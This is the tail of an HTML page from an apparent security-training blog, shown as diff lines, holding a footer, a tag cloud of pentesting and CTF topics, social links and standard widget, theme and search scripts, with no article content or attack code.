+<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script>
+</article>
+</section>
+</div>
+</div>
+<footer class="ui basic center aligned segment" style=background-color:transparent>
+<p>© 2010 - 2021 Classroom</p>
+</footer>
+</div>
+</section>
+<section class=back>
+<div class=dream-max-width>
+<header class="ui basic very padded segment dream-header">
+<div class="ui small circular image">
+<img src=/img/avatar.jpeg>
+</div>
+<div class=content>
+<h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div>
+</h1>
+<article class="ui horizontal list">
+<a class=item href=/categories>
+<i class="th list icon" title="All Categories"></i>
+</a>
+<a class=item href=/tags>
+<i class="tags icon" title="All Tags"></i>
+</a>
+</article>
+<article class=dream-tags>
+<a class="ui label" href=/tags/autopsy/ title=autopsy>
+autopsy
+</a>
+<a class="ui label" href=/tags/backdoor/ title=backdoor>
+backdoor
+</a>
+<a class="ui label" href=/tags/baron-samedit/ title="Baron Samedit">
+Baron Samedit
+</a>
+<a class="ui label" href=/tags/bash/ title=bash>
+bash
+</a>
+<a class="ui label" href=/tags/cheatsheet/ title=cheatsheet>
+cheatsheet
+</a>
+<a class="ui label" href=/tags/config/ title=config>
+config
+</a>
+<a class="ui label" href=/tags/couch/ title=couch>
+couch
+</a>
+<a class="ui label" href=/tags/crisis/ title=Crisis>
+Crisis
+</a>
+<a class="ui label" href=/tags/dominos/ title=dominos>
+dominos
+</a>
+<a class="ui label" href=/tags/empire/ title=Empire>
+Empire
+</a>
+<a class="ui label" href=/tags/encryption/ title=encryption>
+encryption
+</a>
+<a class="ui label" href=/tags/ffuf/ title=ffuf>
+ffuf
+</a>
+<a class="ui label" href=/tags/forensic/ title=forensic>
+forensic
+</a>
+<a class="ui label" href=/tags/gitandcrumpets/ title=gitandcrumpets>
+gitandcrumpets
+</a>
+<a class="ui label" href=/tags/gnupg/ title=gnupg>
+gnupg
+</a>
+<a class="ui label" href=/tags/hackpark/ title=HackPark>
+HackPark
+</a>
+<a class="ui label" href=/tags/hydra/ title=hydra>
+hydra
+</a>
+<a class="ui label" href=/tags/inclusion/ title=inclusion>
+inclusion
+</a>
+<a class="ui label" href=/tags/internship/ title=Internship>
+Internship
+</a>
+<a class="ui label" href=/tags/interview/ title=interview>
+interview
+</a>
+<a class="ui label" href=/tags/kenobi/ title=kenobi>
+kenobi
+</a>
+<a class="ui label" href=/tags/lab/ title=lab>
+lab
+</a>
+<a class="ui label" href=/tags/leaks/ title=leaks>
+leaks
+</a>
+<a class="ui label" href=/tags/linux/ title=Linux>
+Linux
+</a>
+<a class="ui label" href=/tags/memory/ title=memory>
+memory
+</a>
+<a class="ui label" href=/tags/metamorphosis/ title=Metamorphosis>
+Metamorphosis
+</a>
+<a class="ui label" href=/tags/metasploit/ title=metasploit>
+metasploit
+</a>
+<a class="ui label" href=/tags/mobile/ title=Mobile>
+Mobile
+</a>
+<a class="ui label" href=/tags/msf/ title=msf>
+msf
+</a>
+<a class="ui label" href=/tags/msfvenom/ title=msfvenom>
+msfvenom
+</a>
+<a class="ui label" href=/tags/notes/ title=notes>
+notes
+</a>
+<a class="ui label" href=/tags/osi/ title=OSI>
+OSI
+</a>
+<a class="ui label" href=/tags/osi-model/ title="OSI Model">
+OSI Model
+</a>
+<a class="ui label" href=/tags/pentesting/ title=Pentesting>
+Pentesting
+</a>
+<a class="ui label" href=/tags/pgp/ title=PGP>
+PGP
+</a>
+<a class="ui label" href=/tags/pip/ title=pip>
+pip
+</a>
+<a class="ui label" href=/tags/pip2/ title=pip2>
+pip2
+</a>
+<a class="ui label" href=/tags/post-exploitation/ title=Post-Exploitation>
+Post-Exploitation
+</a>
+<a class="ui label" href=/tags/powershell/ title=powershell>
+powershell
+</a>
+<a class="ui label" href=/tags/putty/ title=putty>
+putty
+</a>
+<a class="ui label" href=/tags/python/ title=python>
+python
+</a>
+<a class="ui label" href=/tags/razorblack/ title=RazorBlack>
+RazorBlack
+</a>
+<a class="ui label" href=/tags/redteaming/ title=redteaming>
+redteaming
+</a>
+<a class="ui label" href=/tags/ref/ title=Ref>
+Ref
+</a>
+<a class="ui label" href=/tags/rooms/ title=rooms>
+rooms
+</a>
+<a class="ui label" href=/tags/rootme/ title=RootMe>
+RootMe
+</a>
+<a class="ui label" href=/tags/rpwebscanning/ title=rpwebscanning>
+rpwebscanning
+</a>
+<a class="ui label" href=/tags/script/ title=script>
+script
+</a>
+<a class="ui label" href=/tags/scripting/ title=Scripting>
+Scripting
+</a>
+<a class="ui label" href=/tags/simple-ctf/ title="Simple CTF">
+Simple CTF
+</a>
+<a class="ui label" href=/tags/splunk/ title=splunk>
+splunk
+</a>
+<a class="ui label" href=/tags/stego/ title=stego>
+stego
+</a>
+<a class="ui label" href=/tags/sysmon/ title=sysmon>
+sysmon
+</a>
+<a class="ui label" href=/tags/thefindcommand/ title=Thefindcommand>
+Thefindcommand
+</a>
+<a class="ui label" href=/tags/thm/ title=thm>
+thm
+</a>
+<a class="ui label" href=/tags/tmux/ title=tmux>
+tmux
+</a>
+<a class="ui label" href=/tags/tools/ title=tools>
+tools
+</a>
+<a class="ui label" href=/tags/tryhackme/ title=tryhackme>
+tryhackme
+</a>
+<a class="ui label" href=/tags/vapt/ title=vapt>
+vapt
+</a>
+<a class="ui label" href=/tags/volatility/ title=Volatility>
+Volatility
+</a>
+<a class="ui label" href=/tags/vuln-labs/ title="vuln labs">
+vuln labs
+</a>
+<a class="ui label" href=/tags/vulnversity/ title=Vulnversity>
+Vulnversity
+</a>
+<a class="ui label" href=/tags/web-scanning/ title="web scanning">
+web scanning
+</a>
+<a class="ui label" href=/tags/wireshark/ title=wireshark>
+wireshark
+</a>
+</article>
+</div>
+</header>
+<div class="ui relaxed grid dream-grid dream-back">
+<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+<article class="ui segment">
+<h3 class="ui header">Social Links</h3>
+<nav class="ui secondary menu dream-menu dream-socials">
+<div class=item>
+<a href=/index.xml>
+<i class="large rss square icon" title=RSS></i>
+</a>
+</div>
+<div class=item>
+<a href=mailto:classroom@anir0y.in>
+<i class="large mail icon" title=Email></i>
+</a>
+</div>
+<div class=item>
+<a href=https://twitter.com/anir0y target=_blank>
+<i class="large twitter icon" title=Twitter></i>
+</a>
+</div>
+<div class=item>
+<a href=https://facebook.com/anir0yofficial target=_blank>
+<i class="large facebook icon" title=Facebook></i>
+</a>
+</div>
+<div class=item>
+<a href=https://instagram.com/anir0yofficial target=_blank>
+<i class="large instagram icon" title=Instagram></i>
+</a>
+</div>
+<div class=item>
+<a href=https://www.linkedin.com/in/anir0y target=_blank>
+<i class="large linkedin icon" title=Linkedin></i>
+</a>
+</div>
+<div class=item>
+<a href=https://github.com/anir0y target=_blank>
+<i class="large github icon" title=GitHub></i>
+</a>
+</div>
+</nav>
+</article>
+</div>
+<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+<article class="ui segment">
+YOU CAN RESUE MY CONTENT
+</article>
+</div>
+</div>
+</div>
+</section>
+</div>
+</div>
+<script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script>
+<script src=/js/jquery.min.js></script>
+<script src=/js/semantic.min.js></script>
+<script src=/js/jquery.overlayScrollbars.min.js></script>
+<script src=/js/header.js></script>
+<script src=/js/main.js></script>
+<script src=/js/theme.js></script>
+<script src=/js/html2canvas.min.js></script>
+<script src=/js/post.js></script>
+<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script>
+<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script>
+<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script>
+<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script>
+<div class="ui inverted segment" id=dream-search>
+<div class="ui search">
+<div class="ui transparent input">
+<input class=prompt type=text placeholder=Search>
+</div>
+<div class=results></div>
+</div>
+</div>
+<script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script>
+<script src=/js/search.js></script>
+</body>
+</html>
